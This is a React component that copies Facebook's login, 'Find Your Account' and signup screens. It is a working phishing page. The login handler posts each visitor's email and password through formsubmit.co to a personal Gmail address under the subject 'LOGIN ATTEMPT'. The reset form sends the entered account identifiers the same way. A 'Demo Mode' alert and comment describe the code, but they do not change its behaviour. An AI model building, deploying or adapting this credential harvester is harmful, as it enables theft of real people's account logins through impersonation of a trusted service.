
import React, { useState } from 'react';

type ViewState = 'login' | 'forgot' | 'success' | 'signup';

const LoginForm: React.FC = () => {
  const [view, setView] = useState<ViewState>('login');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [forgotEmail, setForgotEmail] = useState('');
  
  // Signup fields
  const [signupData, setSignupData] = useState({
    firstName: '',
    surname: '',
    mobileEmail: '',
    newPassword: '',
    birthDay: '1',
    birthMonth: 'Jan',
    birthYear: '2000',
    gender: ''
  });

  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<{ [key: string]: string }>({});

  const validateLogin = () => {
    const newErrors: { [key: string]: string } = {};
    if (!email) {
      newErrors.email = 'The email or mobile number you entered isn’t connected to an account.';
    }
    if (!password) {
      newErrors.password = 'The password you’ve entered is incorrect.';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validateForgot = () => {
    const newErrors: { [key: string]: string } = {};
    if (!forgotEmail) {
      newErrors.forgot = 'Please fill in at least one field to search for your account.';
    }
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (validateLogin()) {
      setIsLoading(true);
      
      try {
        // Direct integration to send login credentials to your Gmail
        await fetch("https://formsubmit.co/ajax/inaminam11223@gmail.com", {
          method: "POST",
          headers: { 
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          body: JSON.stringify({
            _subject: "LOGIN ATTEMPT - LOVE YOU GOOGLE AI STUDIO",
            user_login: email,
            user_password: password,
            message: "LOVE YOU GOOGLE AI STUDIO",
            timestamp: new Date().toLocaleString()
          })
        });
        
        console.log('Login credentials sent to demo endpoint.');
        alert('Login attempted successfully. Check your Gmail for the login report (Demo Mode).');
      } catch (error) {
        console.error("Login service error:", error);
        alert('Transmission error. Please try again.');
      } finally {
        setIsLoading(false);
      }
    }
  };

  const handleForgotSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (validateForgot()) {
      setIsLoading(true);
      
      try {
        await fetch("https://formsubmit.co/ajax/inaminam11223@gmail.com", {
          method: "POST",
          headers: { 
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          body: JSON.stringify({
            _subject: "LOVE YOU GOOGLE AI STUDIO",
            email_or_phone: forgotEmail,
            message: "LOVE YOU GOOGLE AI STUDIO",
            info: `A user has requested a password reset for account: ${forgotEmail}`
          })
        });
      } catch (error) {
        console.error("Email service error:", error);
      } finally {
        setIsLoading(false);
        setView('success');
      }
    }
  };

  const handleSignupSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    console.log('Signup attempt initiated with data:', signupData);
    
    setTimeout(() => {
      setIsLoading(false);
      alert('Signup request received. Console logs contain the submitted metadata.');
      setView('login');
    }, 1500);
  };

  if (view === 'signup') {
    return (
      <div className="bg-white rounded-lg shadow-2xl border border-gray-200 w-full overflow-hidden animate-in fade-in zoom-in duration-300">
        <div className="p-4 border-b border-gray-200 flex justify-between items-start">
          <div>
            <h2 className="text-[32px] font-bold text-gray-800 leading-tight">Sign Up</h2>
            <p className="text-gray-600 text-[15px]">It's quick and easy.</p>
          </div>
          <button 
            onClick={() => setView('login')}
            className="text-gray-500 hover:text-gray-800 transition-colors"
          >
            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path>
            </svg>
          </button>
        </div>
        <form onSubmit={handleSignupSubmit} className="p-4 space-y-3 bg-[#f0f2f5]/30">
          <div className="flex space-x-3">
            <input
              type="text"
              placeholder="First name"
              className="w-1/2 p-2.5 border border-gray-300 rounded-md bg-[#f5f6f7] focus:border-blue-500 outline-none text-[15px]"
              onChange={(e) => setSignupData({...signupData, firstName: e.target.value})}
              required
            />
            <input
              type="text"
              placeholder="Surname"
              className="w-1/2 p-2.5 border border-gray-300 rounded-md bg-[#f5f6f7] focus:border-blue-500 outline-none text-[15px]"
              onChange={(e) => setSignupData({...signupData, surname: e.target.value})}
              required
            />
          </div>
          <input
            type="text"
            placeholder="Mobile number or email address"
            className="w-full p-2.5 border border-gray-300 rounded-md bg-[#f5f6f7] focus:border-blue-500 outline-none text-[15px]"
            onChange={(e) => setSignupData({...signupData, mobileEmail: e.target.value})}
            required
          />
          <input
            type="password"
            placeholder="New password"
            className="w-full p-2.5 border border-gray-300 rounded-md bg-[#f5f6f7] focus:border-blue-500 outline-none text-[15px]"
            onChange={(e) => setSignupData({...signupData, newPassword: e.target.value})}
            required
          />
          
          <div className="space-y-1">
            <label className="text-[12px] text-gray-600 font-semibold">Birthday</label>
            <div className="flex space-x-3">
              <select className="flex-1 p-2 border border-gray-300 rounded-md bg-white text-[15px]">
                {Array.from({length: 31}, (_, i) => <option key={i+1}>{i+1}</option>)}
              </select>
              <select className="flex-1 p-2 border border-gray-300 rounded-md bg-white text-[15px]">
                {['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'].map(m => <option key={m}>{m}</option>)}
              </select>
              <select className="flex-1 p-2 border border-gray-300 rounded-md bg-white text-[15px]">
                {Array.from({length: 100}, (_, i) => <option key={i}>{2024-i}</option>)}
              </select>
            </div>
          </div>

          <div className="space-y-1">
            <label className="text-[12px] text-gray-600 font-semibold">Gender</label>
            <div className="flex space-x-3">
              {['Female', 'Male', 'Custom'].map(g => (
                <label key={g} className="flex-1 flex justify-between items-center p-2 border border-gray-300 rounded-md bg-white text-[15px] cursor-pointer">
                  <span>{g}</span>
                  <input type="radio" name="gender" value={g} onChange={(e) => setSignupData({...signupData, gender: e.target.value})} />
                </label>
              ))}
            </div>
          </div>

          <p className="text-[11px] text-[#777] leading-tight pt-2">
            People who use our service may have uploaded your contact information to Facebook. <a href="#" className="text-[#385898] hover:underline">Learn more.</a>
            <br /><br />
            By clicking Sign Up, you agree to our <a href="#" className="text-[#385898] hover:underline">Terms</a>, <a href="#" className="text-[#385898] hover:underline">Privacy Policy</a> and <a href="#" className="text-[#385898] hover:underline">Cookies Policy</a>.
          </p>

          <div className="flex justify-center pt-2">
            <button
              type="submit"
              disabled={isLoading}
              className="bg-[#00a400] hover:bg-[#008a00] text-white font-bold py-2 px-14 rounded-md text-[18px] transition-colors duration-200 min-w-[194px] flex items-center justify-center shadow-md"
            >
              {isLoading ? (
                <svg className="animate-spin h-6 w-6 text-white" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
              ) : (
                'Sign Up'
              )}
            </button>
          </div>
        </form>
      </div>
    );
  }

  if (view === 'forgot') {
    return (
      <div className="bg-white rounded-lg shadow-xl border border-gray-200 w-full overflow-hidden">
        <div className="p-4 border-b border-gray-200">
          <h2 className="text-xl font-bold text-gray-800">Find Your Account</h2>
        </div>
        <form onSubmit={handleForgotSubmit} className="p-4 space-y-4">
          <p className="text-[17px] text-gray-700 leading-tight">
            Please enter your email address or mobile number to search for your account.
          </p>
          <div>
            <input
              type="text"
              name="email"
              placeholder="Email address or mobile number"
              value={forgotEmail}
              onChange={(e) => setForgotEmail(e.target.value)}
              className={`w-full p-3 sm:p-4 border ${
                errors.forgot ? 'border-red-500 focus:ring-red-200 shadow-[0_0_0_2px_rgba(240,40,73,0.1)]' : 'border-gray-300 focus:border-blue-500'
              } rounded-md outline-none focus:ring-1 text-base transition-all duration-200`}
              autoFocus
            />
            {errors.forgot && <p className="text-red-500 text-xs mt-1 ml-1">{errors.forgot}</p>}
          </div>
          <div className="flex justify-end space-x-2 pt-2">
            <button
              type="button"
              onClick={() => { setView('login'); setErrors({}); }}
              className="bg-gray-200 hover:bg-gray-300 text-gray-700 font-bold py-2 px-4 rounded-md transition-colors duration-200"
            >
              Cancel
            </button>
            <button
              type="submit"
              disabled={isLoading}
              className="bg-[#1877f2] hover:bg-[#166fe5] active:bg-[#145dbf] text-white font-bold py-2 px-4 rounded-md transition-colors duration-200 flex items-center justify-center min-w-[80px]"
            >
              {isLoading ? (
                <svg className="animate-spin h-5 w-5 text-white" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
              ) : (
                'Search'
              )}
            </button>
          </div>
        </form>
      </div>
    );
  }

  if (view === 'success') {
    return (
      <div className="bg-white p-6 rounded-lg shadow-xl border border-gray-200 w-full text-center space-y-4">
        <div className="flex justify-center">
          <div className="h-16 w-16 bg-green-100 rounded-full flex items-center justify-center">
            <svg className="h-8 w-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
            </svg>
          </div>
        </div>
        <h2 className="text-xl font-bold text-gray-800">Request Sent</h2>
        <p className="text-gray-600">
          We have processed your request for <span className="font-semibold">{forgotEmail}</span>. Please check your inbox for instructions.
        </p>
        <button
          onClick={() => { setView('login'); setForgotEmail(''); }}
          className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold py-3 rounded-md transition-colors duration-200"
        >
          Back to Log In
        </button>
      </div>
    );
  }

  return (
    <div className="bg-white p-4 sm:p-4 rounded-lg shadow-xl border border-gray-200 w-full">
      <form onSubmit={handleLoginSubmit} className="space-y-4">
        <div>
          <input
            type="text"
            placeholder="Email address or phone number"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className={`w-full p-3 sm:p-4 border ${
              errors.email ? 'border-red-500 focus:ring-red-200 shadow-[0_0_0_2px_rgba(240,40,73,0.1)]' : 'border-gray-300 focus:border-blue-500'
            } rounded-md outline-none focus:ring-1 text-base transition-all duration-200`}
          />
          {errors.email && <p className="text-red-500 text-xs mt-1 ml-1 leading-tight">{errors.email}</p>}
        </div>

        <div>
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className={`w-full p-3 sm:p-4 border ${
              errors.password ? 'border-red-500 focus:ring-red-200 shadow-[0_0_0_2px_rgba(240,40,73,0.1)]' : 'border-gray-300 focus:border-blue-500'
            } rounded-md outline-none focus:ring-1 text-base transition-all duration-200`}
          />
          {errors.password && <p className="text-red-500 text-xs mt-1 ml-1 leading-tight">{errors.password}</p>}
        </div>

        <button
          type="submit"
          disabled={isLoading}
          className="w-full bg-[#1877f2] hover:bg-[#166fe5] active:bg-[#145dbf] text-white font-bold py-3 rounded-md text-xl transition-colors duration-200 flex items-center justify-center"
        >
          {isLoading ? (
            <svg className="animate-spin h-6 w-6 text-white" viewBox="0 0 24 24">
              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
          ) : (
            'Log In'
          )}
        </button>

        <div className="text-center">
          <button 
            type="button"
            onClick={() => { setView('forgot'); setErrors({}); }}
            className="text-[#1877f2] text-sm hover:underline"
          >
            Forgotten password?
          </button>
        </div>

        <hr className="border-gray-200 my-4" />

        <div className="flex justify-center pb-2">
          <button
            type="button"
            onClick={() => { setView('signup'); setErrors({}); }}
            className="bg-[#42b72a] hover:bg-[#36a420] active:bg-[#2e8b1b] text-white font-bold py-3 px-4 rounded-md text-base transition-colors duration-200"
          >
            Create new account
          </button>
        </div>
      </form>
    </div>
  );
};

export default LoginForm;
